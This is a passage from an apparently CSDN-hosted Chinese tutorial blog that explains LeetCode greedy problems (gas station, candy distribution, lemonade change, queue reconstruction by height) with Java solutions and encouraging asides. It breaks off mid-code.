punctuation\">;</span>\n        <span class=\"token comment\">// 需要对数组元素取相反数的index</span>\n        <span class=\"token keyword\">int</span> index <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">for</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> k<span class=\"token punctuation\">;</span> i <span class=\"token operator\">++</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{\n    <!-- --></span>\n        	<span class=\"token comment\">// 遇到负数</span>\n            <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>nums<span class=\"token punctuation\">[</span>index<span class=\"token punctuation\">]</span> <span class=\"token operator\">&lt;</span> <span class=\"token number\">0</span> <span class=\"token operator\">&amp;&amp;</span> i <span class=\"token operator\">&lt;</span> nums<span class=\"token punctuation\">.</span>length <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{\n    <!-- --></span>\n            	<span class=\"token comment\">// 直接取反</span>\n                nums<span class=\"token punctuation\">[</span>index<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token operator\">-</span> nums<span class=\"token punctuation\">[</span>index<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n                <span class=\"token comment\">// 将index控制在绝对值最小的数组元素上</span>\n                <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>nums<span class=\"token punctuation\">[</span>index<span class=\"token punctuation\">]</span> <span class=\"token operator\">&gt;=</span> <span class=\"token class-name\">Math</span><span class=\"token punctuation\">.</span><span class=\"token function\">abs</span><span class=\"token punctuation\">(</span>nums<span class=\"token punctuation\">[</span>index <span class=\"token operator\">+</span> <span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> index <span class=\"token operator\">++</span><span class=\"token punctuation\">;</span>\n                <span class=\"token keyword\">continue</span><span class=\"token punctuation\">;</span>\n            <span class=\"token punctuation\">}</span>\n            <span class=\"token comment\">// 非负数直接取相反数</span>\n            nums<span class=\"token punctuation\">[</span>index<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token operator\">-</span> nums<span class=\"token punctuation\">[</span>index<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">}</span>\n        <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> nums<span class=\"token punctuation\">.</span>length<span class=\"token punctuation\">;</span> i <span class=\"token operator\">++</span><span class=\"token punctuation\">)</span> sum <span class=\"token operator\">+=</span> nums<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">return</span> sum<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n</code></pre> \n <blockquote> \n  <p>加油加油，坚持就是胜利！<img src=\"https://img-blog.csdnimg.cn/20210610224901510.png\" alt=\"在这里插入图片描述\"></p> \n </blockquote> \n <hr> \n <h2><a id=\"8httpsleetcodecncomproblemsgasstation_303\"></a><a href=\"https://leetcode-cn.com/problems/gas-station/\">8.加油站</a></h2> \n <blockquote> \n  <p>在一条环路上有 N 个加油站，其中第 i 个加油站有汽油 gas[i] 升。<br> 你有一辆油箱容量无限的的汽车，从第 i 个加油站开往第 i+1 个加油站需要消耗汽油 cost[i] 升。你从其中的一个加油站出发，开始时油箱为空。<br> 如果你可以绕环路行驶一周，则返回出发时加油站的编号，否则返回 -1。<br> 说明:<br> 1、如果题目有解，该答案即为唯一答案。<br> 2、输入数组均为非空数组，且长度相同。<br> 3、输入数组中的元素均为非负数。<br> <img src=\"https://img-blog.csdnimg.cn/20210608122436471.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2U5MzUwNTIzMTk=,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br> <font color=\"#00f\"><strong>解题思路</strong>: </font><br> <strong>问题分析</strong>：<br> 根据题意，有两种情况，一种是存在这么一个加油站，使得可以完成一圈，另一种就是无法跑完一圈。那<strong>么如何界定能否跑完呢</strong>？我们可以这样想，<strong>把所有加油站的油都加起来，如果比所有需要的油加起来还多，那肯定就是能跑完了</strong>，只不过就是在哪里开始出发的问题啦。这样我们进入能跑完的分支，我们就得分析分析你跑完一个路程，所加上的油能否比消耗的油多，至少不能路上抛锚吧，所以我们需要记录车里所<strong>剩余的油量</strong>，通过它的正负来判断一开始选的位置能否满足跑一圈的需求。如果不满足，我们就根据当前加油站的位置，更换新的起点。<br> <strong>问题抽象：</strong><br> 遍历数组的同时记录当前剩余的油量是否为正数，并依次来更新，出发点的位置，同时还需要记录总油量的差值，如果跑完一圈下来总油量是负的，那就说明跑不完，返回-1<br> <strong>实现步骤：</strong><br> 1、定义<code>rest</code> 当前剩余油量，<code>totalGas</code>总剩余油量，<code>index</code>记录出发点。<br> 2、遍历两个数组，记录差值为当前一趟所剩余的油量，累加到当前剩余油量以及总剩余油量。<br> 3、如果当前剩余油量为负，更换起点，当前油量置0。<br> 4、最后，如果总油量小于0，返回-1；否则返回起点。</p> \n </blockquote> \n <pre><code class=\"prism language-java\"><span class=\"token keyword\">class</span> <span class=\"token class-name\">Solution</span> <span class=\"token punctuation\">{\n    <!-- --></span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">int</span> <span class=\"token function\">canCompleteCircuit</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> gas<span class=\"token punctuation\">,</span> <span class=\"token keyword\">int</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> cost<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{\n    <!-- --></span>\n        <span class=\"token keyword\">int</span> n <span class=\"token operator\">=</span> gas<span class=\"token punctuation\">.</span>length<span class=\"token punctuation\">;</span>\n        <span class=\"token comment\">// 初始化油量</span>\n        <span class=\"token keyword\">int</span> rest <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> totalGas <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">int</span> index <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 记录出发地点</span>\n        <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> n<span class=\"token punctuation\">;</span> i <span class=\"token operator\">++</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{\n    <!-- --></span>\n	        <span class=\"token comment\">// 计算从出发地点开始所剩余的油量</span>\n            rest <span class=\"token operator\">+=</span> gas<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> cost<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span> \n            <span class=\"token comment\">// 计算从计位点0开始所剩余的总油量</span>\n            totalGas <span class=\"token operator\">+=</span> gas<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> cost<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n            <span class=\"token comment\">// 选点错误，更换出发地点</span>\n            <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>rest <span class=\"token operator\">&lt;</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{\n    <!-- --></span>\n                index <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>i <span class=\"token operator\">+</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">%</span> n<span class=\"token punctuation\">;</span>\n                rest <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 新出发地开始的油量置空</span>\n            <span class=\"token punctuation\">}</span>\n        <span class=\"token punctuation\">}</span>\n        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>totalGas <span class=\"token operator\">&lt;</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">return</span> <span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 无法跑完行程</span>\n        <span class=\"token keyword\">return</span> index<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n</code></pre> \n <blockquote> \n  <p><strong>马上就掌握三分之二啦～</strong><img src=\"https://img-blog.csdnimg.cn/20210610224944485.png\" alt=\"在这里插入图片描述\"></p> \n </blockquote> \n <hr> \n <h2><a id=\"9httpsleetcodecncomproblemscandy_348\"></a><a href=\"https://leetcode-cn.com/problems/candy/\">9.分发糖果</a></h2> \n <blockquote> \n  <p>老师想给孩子们分发糖果，有 N 个孩子站成了一条直线，老师会根据每个孩子的表现，预先给他们评分。<br> 你需要按照以下要求，帮助老师给这些孩子分发糖果：<br> 1、每个孩子至少分配到 1 个糖果。<br> 2、评分更高的孩子必须比他两侧的邻位孩子获得更多的糖果。<br> 那么这样下来，老师至少需要准备多少颗糖果呢？<br> <img src=\"https://img-blog.csdnimg.cn/20210608140305790.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2U5MzUwNTIzMTk=,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br> <font color=\"#00f\"><strong>解题思路</strong>: </font><br> <strong>问题分析</strong>：<br> leetcode上标了<strong>困难题</strong>，那么这道题难在哪里呢，难在它的<strong>贪心策略</strong>上，我们如果从头开始遍历数字，既要考虑这个数字会不会比左边大，又要考虑这是数字会不会比右边大，大家可以清晰的感觉到，啊，好难决策，万一后面的都很小呢，又要回过头来修改前面的数，简直难受到爆。那么根据这种情况，我们换一种思路，采用贪心策略中：多个局部最优解组成全局最优解的性质–&gt; <strong>采用左视角和右视角</strong>，只要两个视角都符合条件，那么结果一定符合条件。因为题目中仅有两点要求，第一点每个人都要有糖，用来初始化，第二点就是用来用来确定左右时图中的模样，有点像搭积木一样。左视图：保证后面越大，发的越多，小的看不见的就略过并重新开始搭积木。右视图：从小开始搭积木，遇到大的和自己看到的和左视图的拿来比较取最大的那个（否则将破坏左视角的最优局部解）。<br> <strong>问题抽象：</strong><br> 数组赋1，遍历评分数组，升序+1，降序置1重新升序。倒叙遍历评分数组，与升序数组比较，插入。<br> <strong>实现步骤：</strong><br> 1、将糖果数组赋1<br> 2、遍历评分数组，如果后面的比前面的大，就让后面的是前面的糖果树+1<br> 3、倒序遍历数组，如果前面的比后面的大，就让前面的是后面的糖果数加1 或者 为从步骤2中得到的更大的数字。</p> \n </blockquote> \n <pre><code class=\"prism language-java\"><span class=\"token keyword\">class</span> <span class=\"token class-name\">Solution</span> <span class=\"token punctuation\">{\n    <!-- --></span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">int</span> <span class=\"token function\">candy</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> ratings<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{\n    <!-- --></span>\n        <span class=\"token keyword\">int</span> ans <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n        <span class=\"token comment\">// 初始化，并赋1</span>\n        <span class=\"token keyword\">int</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> candies <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token keyword\">int</span><span class=\"token punctuation\">[</span>ratings<span class=\"token punctuation\">.</span>length<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> candies<span class=\"token punctuation\">.</span>length<span class=\"token punctuation\">;</span> i <span class=\"token operator\">++</span><span class=\"token punctuation\">)</span> candies<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span>\n        <span class=\"token comment\">// 左视图遍历</span>\n        <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> i <span class=\"token operator\">=</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> ratings<span class=\"token punctuation\">.</span>length<span class=\"token punctuation\">;</span> i <span class=\"token operator\">++</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{\n    <!-- --></span>\n            <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>ratings<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">&gt;</span> ratings<span class=\"token punctuation\">[</span>i <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> candies<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> candies<span class=\"token punctuation\">[</span>i <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">}</span>\n        <span class=\"token comment\">// 右视图遍历</span>\n        <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> i <span class=\"token operator\">=</span> ratings<span class=\"token punctuation\">.</span>length <span class=\"token operator\">-</span> <span class=\"token number\">2</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&gt;=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">--</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{\n    <!-- --></span>\n            <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>ratings<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">&gt;</span> ratings<span class=\"token punctuation\">[</span>i <span class=\"token operator\">+</span> <span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> candies<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token class-name\">Math</span><span class=\"token punctuation\">.</span><span class=\"token function\">max</span><span class=\"token punctuation\">(</span>candies<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> candies<span class=\"token punctuation\">[</span>i <span class=\"token operator\">+</span> <span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 同时满足左视图</span>\n        <span class=\"token punctuation\">}</span>\n        <span class=\"token comment\">// 相加结果</span>\n        <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> candies<span class=\"token punctuation\">.</span>length<span class=\"token punctuation\">;</span> i <span class=\"token operator\">++</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{\n    <!-- --></span>\n            ans <span class=\"token operator\">+=</span> candies<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">}</span>\n        <span class=\"token keyword\">return</span> ans<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n</code></pre> \n <blockquote> \n  <p><strong>掌握三分之二啦～</strong><img src=\"https://img-blog.csdnimg.cn/20210610225037740.png\" alt=\"在这里插入图片描述\"></p> \n </blockquote> \n <hr> \n <h2><a id=\"10httpsleetcodecncomproblemslemonadechange_389\"></a><a href=\"https://leetcode-cn.com/problems/lemonade-change/\">10.柠檬水找零</a></h2> \n <blockquote> \n  <p>在柠檬水摊上，每一杯柠檬水的售价为 5 美元。<br> 顾客排队购买你的产品，（按账单 bills 支付的顺序）一次购买一杯。<br> 每位顾客只买一杯柠檬水，然后向你付 5 美元、10 美元或 20 美元。你必须给每个顾客正确找零，也就是说净交易是每位顾客向你支付 5 美元。<br> 注意，一开始你手头没有任何零钱。<br> 如果你能给每位顾客正确找零，返回 true ，否则返回 false 。<br> <img src=\"https://img-blog.csdnimg.cn/20210608162128873.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2U5MzUwNTIzMTk=,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br> <font color=\"#00f\"><strong>解题思路</strong>: </font><br> <strong>问题分析</strong>：<br> 这种找钱类型的题，应该是我们人类最熟练处理的贪心问题了吧。大家在找钱的时候肯定是先找最大的，然后在找最小的吧。（如果不是，那可能就有点尴尬了）。这样找钱可以确保找的钱的数量最少。这道题的找钱的那个抽屉里面只有5美元，10美元。根据顾客给钱的数量大致可以这样分为三个情况：<br> 1、顾客给你5块： 欣然收下，5块个数 ++；<br> 2、顾客给你10块：还可以，找他5块，5块个数 --，10块个数++；<br> 3、顾客给你20块：很烦，找他10+5，或者5+5+5；分别10块个数-- 5块个数-- 和 5块个数 -= 3<br> 明确了思路，答案其实已经就出来了，那么这道题的贪心策略在哪里呢？大家在做的时候可能不以为然的就做出来了而感觉没有用到贪心，其实这里的贪心在第三种情况，给你20的时候，你该怎么找钱，我们发现情况2，和情况3都必须使用5块的，为了不让5块的出现不够的情况，在第三种情况出现的时候我们选择找钱的时候，将只有第三种情况才会使用的10块钱先找给他，在找给他1个5块就可以了。能保证让“最有价值”的5块尽可能少的消耗，局部最优使得全局最优。<br> <strong>问题抽象：</strong><br> 遍历<code>bills</code>数组遇到5块就加，遇到10块，判断后，减5个数，加10个数。遇到20块，边找钱，边判断返回。<br> <strong>实现步骤：</strong><br> 1、初始化5块、10块的个数。<br> 2、遍历bills数组：三种情况：</p> \n  <ul>\n   <li>如果是5块，就给5块钱的个数+1。</li>\n   <li>如果是10块，就找去5块钱，并给10块钱个数+1。</li>\n   <li>如果是20块，就先找10块，在找5块。</li>\n  </ul> \n </blockquote> \n <pre><code class=\"prism language-java\"><span class=\"token keyword\">class</span> <span class=\"token class-name\">Solution</span> <span class=\"token punctuation\">{\n    <!-- --></span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">boolean</span> <span class=\"token function\">lemonadeChange</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> bills<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{\n    <!-- --></span>\n    	<span class=\"token comment\">// 初始化5、10块的数量</span>\n        <span class=\"token keyword\">int</span> cent5 <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> cent10 <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> bills<span class=\"token punctuation\">.</span>length<span class=\"token punctuation\">;</span> i <span class=\"token operator\">++</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{\n    <!-- --></span>\n        	<span class=\"token comment\">// 5块直接拿下！</span>\n            <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>bills<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">==</span> <span class=\"token number\">5</span><span class=\"token punctuation\">)</span> cent5 <span class=\"token operator\">++</span><span class=\"token punctuation\">;</span>\n            <span class=\"token comment\">// 10块找他5块</span>\n            <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>bills<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">==</span> <span class=\"token number\">10</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{\n    <!-- --></span>\n                <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>cent5 <span class=\"token operator\">==</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">return</span> <span class=\"token boolean\">false</span><span class=\"token punctuation\">;</span>\n                cent5 <span class=\"token operator\">--</span><span class=\"token punctuation\">;</span>\n                cent10 <span class=\"token operator\">++</span><span class=\"token punctuation\">;</span>\n            <span class=\"token punctuation\">}</span>\n            <span class=\"token comment\">// 20块</span>\n            <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>bills<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">==</span> <span class=\"token number\">20</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{\n    <!-- --></span>\n            	<span class=\"token comment\">// 没有5块还想找钱？？</span>\n                <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>cent5 <span class=\"token operator\">==</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">return</span> <span class=\"token boolean\">false</span><span class=\"token punctuation\">;</span>\n                <span class=\"token comment\">// 有10块就先上大的！！</span>\n                <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>cent10 <span class=\"token operator\">&gt;</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{\n    <!-- --></span>\n                    cent10 <span class=\"token operator\">--</span><span class=\"token punctuation\">;</span>\n                    cent5 <span class=\"token operator\">--</span><span class=\"token punctuation\">;</span>\n                <span class=\"token punctuation\">}</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">{\n    <!-- --></span>\n                    cent5 <span class=\"token operator\">-=</span> <span class=\"token number\">3</span><span class=\"token punctuation\">;</span>\n                    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>cent5 <span class=\"token operator\">&lt;</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">return</span> <span class=\"token boolean\">false</span><span class=\"token punctuation\">;</span>\n                <span class=\"token punctuation\">}</span>\n            <span class=\"token punctuation\">}</span>\n        <span class=\"token punctuation\">}</span>\n        <span class=\"token keyword\">return</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n</code></pre> \n <blockquote> \n  <p><strong>掌握了四分之三了，你是最棒的！！！</strong><br> <img src=\"https://img-blog.csdnimg.cn/20210610225139273.png\" alt=\"在这里插入图片描述\"></p> \n </blockquote> \n <hr> \n <h2><a id=\"11httpsleetcodecncomproblemsqueuereconstructionbyheight_446\"></a><a href=\"https://leetcode-cn.com/problems/queue-reconstruction-by-height/\">11.根据身高重建队列</a></h2> \n <blockquote> \n  <p>假设有打乱顺序的一群人站成一个队列，数组 <code>people</code> 表示队列中一些人的属性（不一定按顺序）。每个 <code>people[i]</code> = <code>[hi, ki]</code>表示第 <code>i</code> 个人的身高为 <code>hi</code> ，前面 正好 有 <code>ki</code> 个身高大于或等于 <code>hi</code> 的人。<br> 请你重新构造并返回输入数组 <code>people</code> 所表示的队列。返回的队列应该格式化为数组 <code>queue</code> ，其中 <code>queue[j]</code> = <code>[hj, kj]</code> 是队列中第 <code>j</code> 个人的属性（<code>queue[0]</code> 是排在队列前面的人）。<br> <img src=\"https://img-blog.csdnimg.cn/20210608174804221.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2U5MzUwNTIzMTk=,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br> <font color=\"#00f\"><strong>解题思路</strong>: </font><br> <strong>问题分析</strong>：<br> 看了题目有点懵，不要慌，我们可以通过示例来了解题意，其实示例就展现的很清楚了。将一个已经排好序的人群队列的身高和参考值 <code>k</code> 记录下来，随后进行打乱，让我们根据每个人的 <code>[hi, ki]</code> 将队列还原。这道题和我们上一道题有共通之处的就是，<code>hi</code> 和 <code>ki</code> 这样的两个参考点是相互制约的，我们无法通过一次遍历，就将问题处理的十分完美。这道题的贪心思想是什么呢？ 我们在排序的时候可以<strong>根据身高进行第一波筛选</strong>，遇到身高相同的时候，我们<strong>根据 k 进行第二波筛选</strong>。这里，我们可以重写数组的比较器 <code>Comparator</code>，来实现我们自己的比较规则，然后进行排序：如果身高不同就将高的排在后面， 如果身高相同就将 k 大的排在后面。<br> <strong>问题抽象：</strong><br> 根据身高进行升序排序，在身高相同时，根据k进行降序排序，保证符合题目要求</p> \n </blockquote> \n <pre><code class=\"prism language-java\"><span class=\"token keyword\">class</span> <span class=\"token class-name\">Solution</span> <span class=\"token punctuation\">{\n    <!-- --></span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">int</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> <span class=\"token function\">reconstructQueue</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> people<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{\n    <!-- --></span>\n        <span class=\"token class-name\">Arrays</span><span class=\"token punctuation\">.</span><span class=\"token function\">sort</span><span class=\"token punctuation\">(</span>people<span class=\"token punctuation\">,</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Comparator</span><span class=\"token operator\">&lt;</span><span class=\"token keyword\">int</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">&gt;</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{\n    <!-- --></span>\n            <span class=\"token keyword\">public</span> <span class=\"token keyword\">int</span> <span class=\"token function\">compare</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> person1<span class=\"token punctuation\">,</span> <span class=\"token keyword\">int</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> person2<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{\n    <!-- --></span>\n            	<span class=\"token comment\">// 如果身高不同</span>\n                <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>person1<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">!=</span> person2<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{\n    <!-- --></span>\n                	<span class=\"token comment\">// 按照身高升序排列</span>\n                    <span class=\"token keyword\">return</span> person2<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> person1<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n                <span class=\"token punctuation\">}</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">{\n    <!-- --></span>\n                	<span class=\"token comment\">// 身高相同 按照k降序排列</span>\n                    <span class=\"token keyword\">return</span> person1<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> person2<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n                <span class=\"token punctuation\">}</span>\n            <span class=\"token punctuation\">}</span>\n        <span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token class-name\">LinkedList</span><span class=\"token operator\">&lt;</span><span class=\"token keyword\">int</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">&gt;</span> que <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">LinkedList</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token punctuation\">&gt;</span></span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token comment\">// 将我们排列后的人加入队列</span>\n        <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> p <span class=\"token operator\">:</span> people<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{\n    <!-- --></span>\n            que<span class=\"token punctuation\">.</span><span class=\"token function\">add</span><span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> p<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">}</span>\n        <span 